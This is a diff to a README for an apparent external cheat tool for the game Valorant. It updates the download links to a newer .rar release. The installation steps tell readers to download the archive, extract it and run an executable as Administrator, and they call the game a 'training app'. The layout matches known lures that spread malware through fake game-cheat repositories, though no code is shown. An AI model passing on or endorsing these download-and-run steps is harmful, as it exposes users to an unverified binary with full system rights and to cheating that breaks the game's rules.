@@ -12,7 +12,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Maxiforcool18/Valorant-External/releases/download/Valorant5.9/Valorant5.9.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Maxiforcool18/Valorant-External/releases/download/Valorant6.1/Valorant6.1.rar)
 
 </div>
 
@@ -53,9 +53,9 @@
 
 ---
 
-## [🔧 Installation](https://github.com/Maxiforcool18/Valorant-External/releases/download/Valorant5.9/Valorant5.9.rar)
+## [🔧 Installation](https://github.com/Maxiforcool18/Valorant-External/releases/download/Valorant6.1/Valorant6.1.rar)
 
-1. **Download** the latest release from the [Releases](https://github.com/Maxiforcool18/Valorant-External/releases/download/Valorant5.9/Valorant5.9.rar) page.
+1. **Download** the latest release from the [Releases](https://github.com/Maxiforcool18/Valorant-External/releases/download/Valorant6.1/Valorant6.1.rar) page.
 2. **Extract** the archive to a folder on your desktop.
 3. **Run** `Valorant6.1.exe` as **Administrator**.
 4. **Launch** your training app and press `INSERT` to toggle the menu.
